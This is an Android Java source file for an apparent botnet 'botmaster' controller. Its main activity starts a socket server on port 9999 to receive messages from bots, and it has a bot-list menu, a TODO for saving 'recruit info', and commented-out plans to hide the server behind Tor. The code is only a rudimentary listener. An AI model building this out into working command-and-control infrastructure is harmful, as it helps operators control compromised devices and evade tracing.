package botmaster.rolen4lab.lan;

import android.content.Intent;
import android.os.AsyncTask;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.view.Menu;
import android.view.MenuItem;
import android.widget.TextView;
import android.widget.Toast;

import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.ServerSocket;
import java.net.Socket;

public class MainActivity extends AppCompatActivity {
    public TextView mMainScreen;
    public String serverport = "9999";
    public String message = null;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        mMainScreen = (TextView) findViewById(R.id.tv_main_screen);
    }
    /*
    Attempt to have Tor services start.
     */
/*
    public class torservices extends AsyncTask<Void, Void, Void>{

        @Override
        protected Void doInBackground(Void... voids) {
            String filestorageLocation = "torfiles";
            OnionProxymanager onionProxymanager = new AndroidOnionproxyManager(getApplicationContext(), filestorageLocation);
            int totalSecondsPerTorStartup = 4 * 60;
            int totaltriesPerTorStartup = 5;
            try{
                boolean ok = onionProxymanager.startWithRepeat(totalSecondsPerTorStartup, totaltriesPerTorStartup);
                if(!ok)
                    mMainScreen.append("Couldn't start Tor!");
            } catch (InterruptedException | IOException e){
                e.printStackTrace();
            }
        }
    }
*/
    /*
    Here we start the server to receive informations from bots
    Here we should add the Tor connection code
     */

    public class receive extends AsyncTask<String, String, String> {
        @Override
        protected String doInBackground(String... strings) {
            String[] str_port = strings;
            int port = Integer.parseInt(str_port[0]);
            ServerSocket ss;
            message = "started";
            //mMainScreen.append("Before loop : "+message+"\n");
            try {
                ss = new ServerSocket(port);
                while (true){
                    new ServerThreads(ss.accept()).start();
                    // TODO - Saving recruit info after accept
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
            return message;
        }

        @Override
        protected void onPostExecute(String s) {
            mMainScreen.append("On Post Execute : Server stopped \n"+s);

        }

        @Override
        protected void onProgressUpdate(String... values) {
            String[] str_progress = values;
            mMainScreen.append("On progress function"+str_progress[0]+""+str_progress[1]);
        }
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.main, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        int itemThatWasClickedID = item.getItemId();
        if(itemThatWasClickedID==R.id.action_startserver){
            Toast.makeText(this,"Start server", Toast.LENGTH_LONG).show();
            new receive().execute(serverport);
        }else {
            if(itemThatWasClickedID==R.id.action_stopserver){
                Toast.makeText(this,"Tor server", Toast.LENGTH_LONG).show();
            } else {
                if (itemThatWasClickedID == R.id.action_openfile) {
                    startActivity(new Intent(MainActivity.this, BotSummit.class));
                    Toast.makeText(this, "Open bot list", Toast.LENGTH_LONG).show();
                } else {
                    if (itemThatWasClickedID == R.id.action_savefile) {
                        Toast.makeText(this, "Save bot list", Toast.LENGTH_LONG).show();
                    }
                }
            }
        }
        return true;
    }

    public class ServerThreads extends Thread {
        public Socket sokket1 = null;
        public OutputStream dos = null;


        public ServerThreads(Socket sokket) {
            this.sokket1 = sokket;
            try {
                InputStreamReader isr = new InputStreamReader(sokket1.getInputStream());
                BufferedReader br = new BufferedReader(isr);
                message = br.readLine();
                mMainScreen.append("Message received \n");
                br.close();
                isr.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
}
